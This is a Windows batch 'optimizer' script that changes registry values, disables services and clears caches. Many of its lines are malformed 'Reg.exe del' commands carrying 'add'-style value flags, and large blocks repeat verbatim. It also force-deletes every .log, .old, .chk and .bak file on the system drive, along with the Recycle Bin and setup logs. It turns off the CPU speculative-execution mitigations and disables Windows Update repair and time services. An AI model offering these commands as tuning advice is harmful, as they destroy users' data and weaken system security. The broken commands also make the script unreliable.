Reg.exe del "HKCU\Control Panel\Desktop" /v "WaitToKillServiceTimeout" /t REG_SZ /d "1000" /f
Reg.exe del "HKCU\Control Panel\Desktop" /v "HungAppTimeout" /t REG_SZ /d "4000" /f
Reg.exe del "HKCU\Control Panel\Desktop" /v "LowLevelHooksTimeout" /t REG_SZ /d "1000" /f
cls
Reg.exe del "HKCU\Control Panel\Desktop" /v "ForegroundLockTimeout" /t REG_SZ /d "150000" /f
Reg.exe del "HKCU\SOFTWARE\Microsoft\Games" /v "FpsAll" /t REG_DWORD /d "1" /f
Reg.exe del "HKCU\SOFTWARE\Microsoft\Games" /v "GameFluidity" /t REG_DWORD /d "1" /f
Reg.exe del "HKCU\SOFTWARE\Microsoft\Games" /v "FpsStatusGames" /t REG_DWORD /d "16" /f
Reg.exe del "HKCU\SOFTWARE\Microsoft\Games" /v "FpsStatusGamesAll" /t REG_DWORD /d "4" /f
Reg.exe del "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Affinity" /t REG_DWORD /d "0" /f
Reg.exe del "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Background Only" /t REG_SZ /d "False" /f
Reg.exe del "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Clock Rate" /t REG_DWORD /d "10000" /f
Reg.exe del "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "GPU Priority" /t REG_DWORD /d "8" /f
Reg.exe del "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Priority" /t REG_DWORD /d "2" /f
Reg.exe del "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Scheduling Category" /t REG_SZ /d "High" /f
Reg.exe del "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "SFIO Priority" /t REG_SZ /d "High" /f
Reg.exe del "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Latency Sensitive" /t REG_SZ /d "True" /f
Reg.exe del "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency" /v "Affinity" /t REG_DWORD /d "0" /f
Reg.exe del "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency" /v "Background Only" /t REG_SZ /d "False" /f
Reg.exe del "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency" /v "Clock Rate" /t REG_DWORD /d "10000" /f
cls
Reg.exe del "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency" /v "GPU Priority" /t REG_DWORD /d "8" /f
Reg.exe del "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency" /v "Priority" /t REG_DWORD /d "2" /f
Reg.exe del "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency" /v "Scheduling Category" /t REG_SZ /d "High" /f
Reg.exe del "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency" /v "SFIO Priority" /t REG_SZ /d "High" /f
Reg.exe del "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency" /v "Latency Sensitive" /t REG_SZ /d "True" /f
Reg.exe del "HKLM\System\CurrentControlSet\Services\VxD\BIOS" /v "CPUPriority" /t REG_DWORD /d "1" /f
Reg.exe del "HKLM\System\CurrentControlSet\Services\VxD\BIOS" /v "FastDRAM" /t REG_DWORD /d "1" /f
Reg.exe del "HKLM\System\CurrentControlSet\Services\VxD\BIOS" /v "PCIConcur" /t REG_DWORD /d "1" /f
Reg.exe del "HKLM\System\CurrentControlSet\Services\VxD\BIOS" /v "AGPConcur" /t REG_DWORD /d "1" /f
Reg.exe del "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v "Max Cached Icons" /t REG_SZ /d "2000" /f
Reg.exe del "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v "AlwaysUnlodelLL" /t REG_DWORD /d "1" /f
Reg.exe del "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\AlwaysUnlodelLL" /v "Default" /t REG_DWORD /d "1" /f
Reg.exe del "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "EnableBalloonTips" /t REG_DWORD /d "0" /f
cls
Reg.exe del "HKLM\SOFTWARE\Microsoft\MSMQ\Parameters" /v "TCPNoDelay" /t REG_DWORD /d "1" /f
cls
Reg.exe del "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\0cc5b647-c1df-4637-891a-dec35c318583" /v "ValueMin" /t REG_DWORD /d "0" /f
Reg.exe del "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\0cc5b647-c1df-4637-891a-dec35c318583" /v "ValueMax" /t REG_DWORD /d "0" /f
Reg.exe del "HKLM\SYSTEM\ControlSet001\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\0cc5b647-c1df-4637-891a-dec35c318583" /v "ValueMax" /t REG_DWORD /d "0" /f
Reg.exe del "HKLM\SYSTEM\ControlSet001\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\0cc5b647-c1df-4637-891a-dec35c318583" /v "ValueMin" /t REG_DWORD /d "0" /f
Reg.exe del "HKLM\SYSTEM\ControlSet002\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\0cc5b647-c1df-4637-891a-dec35c318583" /v "ValueMax" /t REG_DWORD /d "0" /f
Reg.exe del "HKLM\SYSTEM\ControlSet002\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\0cc5b647-c1df-4637-891a-dec35c318583" /v "ValueMin" /t REG_DWORD /d "0" /f
Reg.exe del "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "HibernateEnabled" /t REG_DWORD /d "0" /f
cls
Reg.exe del "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Power" /v "HiberbootEnabled" /t REG_DWORD /d "0" /f
Reg.exe del "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\893dee8e-2bef-41e0-89c6-b55d0929964c" /v "ValueMax" /t REG_DWORD /d "100" /f
Reg.exe del "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\893dee8e-2bef-41e0-89c6-b55d0929964c\DefaultPowerSchemeValues\8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c" /v "ValueMax" /t REG_DWORD /d "100" /f
Reg.exe del "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Scheduler" /v "VsyncIdleTimeout" /t REG_DWORD /d "0" /f
Reg.exe del "HKCU\System\GameConfigStore" /v "GameDVR_Enabled" /t REG_DWORD /d "0" /f
Reg.exe del "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\GameDVR" /v "AppCaptureEnabled" /t REG_DWORD /d "0" /f
Reg.exe del "HKLM\SOFTWARE\Policies\Microsoft\Windows\GameDVR" /v "AllowgameDVR" /t REG_DWORD /d "0" /f
cls
Reg.exe del "HKLM\SOFTWARE\Intel\GMM" /v "DedicatedSegmentSize" /t REG_DWORD /d "1298" /f
Reg.exe del "HKLM\SYSTEM\CurrentControlSet\Control\PriorityControl" /v "Win32PrioritySeparation" /t REG_DWORD /d "38" /f
Reg.exe del "HKLM\SYSTEM\CurrentControlSet\Control\PriorityControl" /v "IRQ8Priority" /t REG_DWORD /d "1" /f
Reg.exe del "HKLM\SYSTEM\CurrentControlSet\Control\PriorityControl" /v "IRQ16Priority" /t REG_DWORD /d "2" /f
Reg.exe del "HKLM\SYSTEM\ControlSet001\Control\PriorityControl" /v "Win32PrioritySeparation" /t REG_DWORD /d "38" /f
Reg.exe del "HKLM\SYSTEM\ControlSet001\Control\PriorityControl" /v "IRQ8Priority" /t REG_DWORD /d "1" /f
Reg.exe del "HKLM\SYSTEM\ControlSet001\Control\PriorityControl" /v "IRQ16Priority" /t REG_DWORD /d "2" /f
cls
Reg.exe del "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" /v "EnablePrefetcher" /t REG_DWORD /d "0" /f
Reg.exe del "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" /v "EnableSuperfetch" /t REG_DWORD /d "0" /f
Reg.exe del "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" /v "EnableBoottrace" /t REG_DWORD /d "0" /f
Reg.exe del "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoLowDiskSpaceChecks" /t REG_DWORD /d "1" /f
Reg.exe del "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "LinkResolveIgnoreLinkInfo" /t REG_DWORD /d "1" /f
Reg.exe del "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoResolveSearch" /t REG_DWORD /d "1" /f
Reg.exe del "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoResolveTrack" /t REG_DWORD /d "1" /f
Reg.exe del "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoInternetOpenWith" /t REG_DWORD /d "1" /f
Reg.exe del "HKLM\SYSTEM\CurrentControlSet\Control\FileSystem" /v "NtfsMftZoneReservation" /t REG_DWORD /d "1" /f
Reg.exe del "HKLM\SYSTEM\CurrentControlSet\Control\FileSystem" /v "NTFSDisable8dot3NameCreation" /t REG_DWORD /d "1" /f
cls
Reg.exe del "HKLM\SYSTEM\CurrentControlSet\Control\FileSystem" /v "DontVerifyRandomDrivers" /t REG_DWORD /d "1" /f
Reg.exe del "HKLM\SYSTEM\CurrentControlSet\Control\FileSystem" /v "NTFSDisableLastAccessUpdate" /t REG_DWORD /d "1" /f
Reg.exe del "HKLM\SYSTEM\CurrentControlSet\Control\FileSystem" /v "ContigFileAllocSize" /t REG_DWORD /d "64" /f
Reg.exe del "HKCU\Control Panel\Desktop" /v "AutoEndTasks" /t REG_SZ /d "1" /f
Reg.exe del "HKCU\Control Panel\Desktop" /v "MenuShowDelay" /t REG_SZ /d "0" /f
Reg.exe del "HKCU\Control Panel\Desktop" /v "WaitToKillAppTimeout" /t REG_SZ /d "5000" /f
Reg.exe del "HKCU\Control Panel\Desktop" /v "WaitToKillServiceTimeout" /t REG_SZ /d "1000" /f
Reg.exe del "HKCU\Control Panel\Desktop" /v "HungAppTimeout" /t REG_SZ /d "4000" /f
Reg.exe del "HKCU\Control Panel\Desktop" /v "LowLevelHooksTimeout" /t REG_SZ /d "1000" /f
cls
Reg.exe del "HKCU\Control Panel\Desktop" /v "ForegroundLockTimeout" /t REG_SZ /d "150000" /f
Reg.exe del "HKCU\SOFTWARE\Microsoft\Games" /v "FpsAll" /t REG_DWORD /d "1" /f
Reg.exe del "HKCU\SOFTWARE\Microsoft\Games" /v "GameFluidity" /t REG_DWORD /d "1" /f
Reg.exe del "HKCU\SOFTWARE\Microsoft\Games" /v "FpsStatusGames" /t REG_DWORD /d "16" /f
Reg.exe del "HKCU\SOFTWARE\Microsoft\Games" /v "FpsStatusGamesAll" /t REG_DWORD /d "4" /f
Reg.exe del "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Affinity" /t REG_DWORD /d "0" /f
Reg.exe del "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Background Only" /t REG_SZ /d "False" /f
Reg.exe del "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Clock Rate" /t REG_DWORD /d "10000" /f
Reg.exe del "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "GPU Priority" /t REG_DWORD /d "8" /f
Reg.exe del "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Priority" /t REG_DWORD /d "2" /f
Reg.exe del "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Scheduling Category" /t REG_SZ /d "High" /f
Reg.exe del "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "SFIO Priority" /t REG_SZ /d "High" /f
Reg.exe del "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Latency Sensitive" /t REG_SZ /d "True" /f
cls
Reg.exe del "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency" /v "Affinity" /t REG_DWORD /d "0" /f
Reg.exe del "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency" /v "Background Only" /t REG_SZ /d "False" /f
Reg.exe del "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency" /v "Clock Rate" /t REG_DWORD /d "10000" /f
Reg.exe del "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency" /v "GPU Priority" /t REG_DWORD /d "8" /f
Reg.exe del "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency" /v "Priority" /t REG_DWORD /d "2" /f
Reg.exe del "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency" /v "Scheduling Category" /t REG_SZ /d "High" /f
Reg.exe del "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency" /v "SFIO Priority" /t REG_SZ /d "High" /f
Reg.exe del "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency" /v "Latency Sensitive" /t REG_SZ /d "True" /f
Reg.exe del "HKLM\System\CurrentControlSet\Services\VxD\BIOS" /v "CPUPriority" /t REG_DWORD /d "1" /f
cls
Reg.exe del "HKLM\System\CurrentControlSet\Services\VxD\BIOS" /v "FastDRAM" /t REG_DWORD /d "1" /f
Reg.exe del "HKLM\System\CurrentControlSet\Services\VxD\BIOS" /v "PCIConcur" /t REG_DWORD /d "1" /f
Reg.exe del "HKLM\System\CurrentControlSet\Services\VxD\BIOS" /v "AGPConcur" /t REG_DWORD /d "1" /f
Reg.exe del "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v "Max Cached Icons" /t REG_SZ /d "2000" /f
Reg.exe del "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v "AlwaysUnlodelLL" /t REG_DWORD /d "1" /f
Reg.exe del "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\AlwaysUnlodelLL" /v "Default" /t REG_DWORD /d "1" /f
Reg.exe del "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "EnableBalloonTips" /t REG_DWORD /d "0" /f
cls
Reg.exe del "HKLM\SOFTWARE\Microsoft\MSMQ\Parameters" /v "TCPNoDelay" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Software\Intel\Display\igfxcui\Media" /v "InputYUVRangeApplyAlways" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Software\Intel\Display\igfxcui\Media" /v "SharpnessEnabledAlways" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Software\Intel\Display\igfxcui\Media" /v "NoiseReductionEnabledAlways" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Software\Intel\Display\igfxcui\Media" /v "ProcAmpApplyAlways" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\Software\INTEL\Display\igfxcui\MediaKeys" /v "ProcAmpApplyAlways" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\Software\INTEL\Display\igfxcui\MediaKeys" /v "InputYUVRangeApplyAlways" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\Software\INTEL\Display\igfxcui\MediaKeys" /v "SharpnessEnabledAlways" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\Software\INTEL\Display\igfxcui\MediaKeys" /v "NoiseReductionEnabledAlways" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet002\Control\Class\{4D36E968-E325-11CE-BFC1-08002BE10318}\0000" /v "Disable_OverlayDSQualityEnhancement" /t REG_DWORD /d "1" /f
cls
del /s /f /q c:\windows\temp\*.*
rd /s /q c:\windows\temp
md c:\windows\temp
del /s /f /q %temp%\*.*
rd /s /q %temp%
md %temp%
deltree /y c:\windows\tempor~1
deltree /y c:\windows\temp
deltree /y c:\windows\tmp
deltree /y c:\windows\ff*.tmp
deltree /y c:\windows\history
deltree /y c:\windows\cookies
deltree /y c:\windows\recent
deltree /y c:\windows\spool\printers
del /s /f /q c:\windows\tempor~1
del /s /f /q c:\windows\temp
del /s /f /q c:\windows\tmp
del /s /f /q c:\windows\ff*.tmp
del /s /f /q c:\windows\history
del /s /f /q c:\windows\cookies
del /s /f /q c:\windows\recent
del /s /f /q c:\windows\spool\printers
del /s /f /q %userprofile%\Recent\*.*
del /s /f /q C:\Windows\Prefetch\*.*
del /s /f /q C:\Windows\Temp\*.*
del /s /f /q %USERPROFILE%\appdata\local\temp\*.*
del /Q C:\Users\%username%\AppData\Local\Microsoft\Windows\INetCache\IE\*.*
del /Q C:\Windows\Downloaded Program Files\*.*
rd /s /q %SYSTEMDRIVE%\$Recycle.bin
del /Q C:\Users\%username%\AppData\Local\Temp\*.*
del /Q C:\Windows\Temp\*.*
del /Q C:\Windows\Prefetch\*.*
del /s /f /q %SystemRoot%\setupapi.log
del /s /f /q %SystemRoot%\Panther\*
del /s /f /q %SystemRoot%\inf\setupapi.app.log
del /s /f /q %SystemRoot%\inf\setupapi.dev.log
del /s /f /q %SystemRoot%\inf\setupapi.offline.log
del /f /s /q %systemdrive%\*.tmp
del /f /s /q %systemdrive%\*._mp
del /f /s /q %systemdrive%\*.log
del /f /s /q %systemdrive%\*.gid
del /f /s /q %systemdrive%\*.chk
del /f /s /q %systemdrive%\*.old
del /f /s /q %systemdrive%\recycled\*.*
del /f /s /q %windir%\*.bak
del /f /s /q %windir%\prefetch\*.*
del /f /s /q %systemdrive%\$Recycle.Bin\*.*
cls
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0001" /v "*RSSProfile" /t reg_SZ /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0001\Ndi\Params\*RSSProfile" /v "ParamDesc" /t reg_SZ /d "RSS load balancing profile" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0001\Ndi\Params\*RSSProfile" /v "default" /t reg_SZ /d "1" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0001\Ndi\Params\*RSSProfile" /v "type" /t reg_SZ /d "enum" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0001\Ndi\Params\*RSSProfile\Enum" /v "1" /t reg_SZ /d "ClosestProcessor" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0001\Ndi\Params\*RSSProfile\Enum" /v "2" /t reg_SZ /d "ClosestProcessorStatic" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0001\Ndi\Params\*RSSProfile\Enum" /v "3" /t reg_SZ /d "NUMAScaling" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0001\Ndi\Params\*RSSProfile\Enum" /v "4" /t reg_SZ /d "NUMAScalingStatic" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0001\Ndi\Params\*RSSProfile\Enum" /v "5" /t reg_SZ /d "ConservativeScaling" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnableICMPRedirect" /t reg_DWORD /d "1" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnablePMTUDiscovery" /t reg_DWORD /d "1" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "Tcp1323Opts" /t reg_DWORD /d "0" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpMaxDupAcks" /t reg_DWORD /d "2" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpTimedWaitDelay" /t reg_DWORD /d "32" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "GlobalMaxTcpWindowSize" /t reg_DWORD /d "8760" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpWindowSize" /t reg_DWORD /d "8760" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxConnectionsPerServer" /t reg_DWORD /d "0" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxUserPort" /t reg_DWORD /d "65534" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "SackOpts" /t reg_DWORD /d "0" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DefaultTTL" /t reg_DWORD /d "64" /f
reg add "HKLM\SOFTWARE\Microsoft\MSMQ\Parameters" /v "TCPNoDelay" /t reg_DWORD /d "1" /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\csrss.exe\PerfOptions" /v "CpuPriorityClass" /t REG_DWORD /d 3 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\csrss.exe\PerfOptions" /v "IoPriority" /t REG_DWORD /d 3 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v FeatureSettingsOverride /t REG_DWORD /d 3 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v FeatureSettingsOverrideMask /t REG_DWORD /d 3 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DiagTrack" /v "Start" /t REG_DWORD /d 4 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\dmwappushservice" /v "Start" /t REG_DWORD /d 4 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\diagsvc" /v "Start" /t REG_DWORD /d 4 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DPS" /v "Start" /t REG_DWORD /d 4 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\diagnosticshub.standardcollector.service" /v "Start" /t REG_DWORD /d 4 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WdiServiceHost" /v "Start" /t REG_DWORD /d 4 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WdiSystemHost" /v "Start" /t REG_DWORD /d 4 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\MapsBroker" /v "Start" /t REG_DWORD /d 4 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\893dee8e-2bef-41e0-89c6-b55d0929964c" /v "ValueMax" /t reg_DWORD /d "100" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\893dee8e-2bef-41e0-89c6-b55d0929964c\DefaultPowerSchemeValues\8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c" /v "ValueMax" /t reg_DWORD /d "100" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\0cc5b647-c1df-4637-891a-dec35c318583" /v "ValueMin" /t reg_DWORD /d "0" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\0cc5b647-c1df-4637-891a-dec35c318583" /v "ValueMax" /t reg_DWORD /d "0" /f
reg add "HKLM\SYSTEM\ControlSet001\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\0cc5b647-c1df-4637-891a-dec35c318583" /v "ValueMax" /t reg_DWORD /d "0" /f
reg add "HKLM\SYSTEM\ControlSet001\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\0cc5b647-c1df-4637-891a-dec35c318583" /v "ValueMin" /t reg_DWORD /d "0" /f
reg add "HKLM\SYSTEM\ControlSet002\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\0cc5b647-c1df-4637-891a-dec35c318583" /v "ValueMax" /t reg_DWORD /d "0" /f
reg add "HKLM\SYSTEM\ControlSet002\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\0cc5b647-c1df-4637-891a-dec35c318583" /v "ValueMin" /t reg_DWORD /d "0" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\xbgm" /v "Start" /t reg_DWORD /d "4" /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\XboxGipSvc" /v "Start" /t reg_DWORD /d "4" /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WaaSMedicSvc" /v "Start" /t reg_DWORD /d "4" /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time" /v "Start" /t reg_DWORD /d "4" /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\spectrum" /v "Start" /t reg_DWORD /d "4" /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\wcncsvc" /v "Start" /t reg_DWORD /d "4" /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WebClient" /v "Start" /t reg_DWORD /d "4" /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SysMain" /v "Start" /t reg_DWORD /d "4" /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NcaSvc" /v "Start" /t reg_DWORD /d "4" /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\diagsvc" /v "Start" /t reg_DWORD /d "4" /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\UserDataSvc" /v "Start" /t reg_DWORD /d "4" /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\stisvc" /v "Start" /t reg_DWORD /d "4" /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\AdobeFlashPlayerUpdateSvc" /v "Start" /t reg_DWORD /d "4" /f >nul 2>&1 
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\TrkWks" /v "Start" /t reg_DWORD /d "4" /f  >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\dmwappushservice" /v "Start" /t reg_DWORD /d "4" /f >nul 2>&1  
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\PimIndexMaintenanceSvc" /v "Start" /t reg_DWORD /d "4" /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DiagTrack" /v "Start" /t reg_DWORD /d "4" /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\GoogleChromeElevationService" /v "Start" /t reg_DWORD /d "4" /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\OneSyncSvc" /v "Start" /t reg_DWORD /d "4" /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\ibtsiva" /v "Start" /t reg_DWORD /d "4" /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SNMPTRAP" /v "Start" /t reg_DWORD /d "4" /f >nul 2>&1
